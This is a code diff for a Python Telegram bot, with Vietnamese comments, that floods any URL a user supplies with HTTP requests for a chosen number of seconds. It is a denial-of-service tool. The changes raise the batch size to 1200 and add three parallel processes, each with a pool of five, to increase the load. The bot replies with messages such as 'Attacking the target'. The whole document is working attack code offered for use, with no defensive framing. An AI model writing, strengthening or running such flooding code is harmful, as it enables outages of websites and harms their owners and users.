@@ -2,7 +2,6 @@ import telebot
 import requests
 import time
 import psutil
-import datetime
 import multiprocessing
 from concurrent.futures import ThreadPoolExecutor
 from colorama import init, Fore
@@ -28,54 +27,56 @@ def send_batch_requests(url, batch_size):
         for _ in range(batch_size):
             executor.submit(send_request, url)
 
-# Hàm chính gửi yêu cầu HTTP liên tục trong thời gian quy định
+# Hàm chính gửi yêu cầu HTTP liên tục trong thời gian quy định, với 3 tiến trình song song
 def send_requests_with_time_limit(url, duration):
     start_time = time.time()
-    batch_size = 500
+    batch_size = 1200
     
-    with multiprocessing.Pool(processes=5) as pool:  # Giới hạn tiến trình là 5 để tránh quá tải
-        while time.time() - start_time < duration:
-            pool.apply_async(send_batch_requests, (url, batch_size))
-    
-    print(Fore.YELLOW + f"Hoàn thành gửi yêu cầu tới {url} trong {duration} giây.")
+    # Hàm chạy song song trong mỗi tiến trình
+    def run_tab():
+        with multiprocessing.Pool(processes=5) as pool:  # Giới hạn tiến trình là 5 để tránh quá tải
+            while time.time() - start_time < duration:
+                pool.apply_async(send_batch_requests, (url, batch_size))
+
+    # Tạo 3 tiến trình song song (3 "tab" chạy cùng lúc)
+    processes = []
+    for _ in range(3):
+        process = multiprocessing.Process(target=run_tab)
+        process.start()
+        processes.append(process)
+
+    # Đợi cả 3 tiến trình hoàn thành
+    for process in processes:
+        process.join()
+
+    print(Fore.YELLOW + f"Hoàn thành gửi yêu cầu tới {url} trong {duration} giây với 3 tab.")
 
 # Lệnh /start để chào mừng người dùng
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message, "Chào mừng!\nUse the /attack command to start the attack..")
+    bot.reply_to(message, "Chào mừng!\nVui lòng dùng lệnh /free .")
 
 # Lệnh /free để gửi yêu cầu HTTP theo URL và thời gian người dùng yêu cầu
-@bot.message_handler(commands=['attack'])
+@bot.message_handler(commands=['free'])
 def free(message):
     try:
         # Tách tin nhắn thành các phần tử
         args = message.text.split()
         if len(args) < 3:
-            bot.reply_to(message, "Please provide URL and time.\nFor example: /free http://example.com 60")
+            bot.reply_to(message, "Vui lòng cung cấp URL và thời gian. Ví dụ: /free http://example.com 60")
             return
         
         url = args[1]
         duration = int(args[2])
         
-        bot.reply_to(message, f"⚔️Attacking the target link⚔️\n↣Link: {url}\n↣Time: {duration} giây...")
+        bot.reply_to(message, f"⚔️Attacking the target⚔️\n↣Link: {url}\n↣Time: {duration}s")
         
-        # Gửi yêu cầu HTTP
+        # Gửi yêu cầu HTTP với 3 "tab" chạy song song
         send_requests_with_time_limit(url, duration)
         
-        bot.reply_to(message, f"Complete attack\nLink: {url}\nTime: {duration} giây.")
+        bot.reply_to(message, f"⚔️Complete Attack⚔️\n↣Link: {url}\n↣Time: {duration}s")
     except ValueError:
         bot.reply_to(message, "Thời gian phải là một số nguyên dương. Vui lòng thử lại.")
-
-@bot.message_handler(commands=['time'])
-def show_uptime(message):
-   
-    current_time = time.time()
-    uptime = current_time - start_time
-    hours = int(uptime // 3600)
-    minutes = int((uptime % 3600) // 60)
-    seconds = int(uptime % 60)
-    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
-    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')
     
 
 @bot.message_handler(commands=['cpu'])
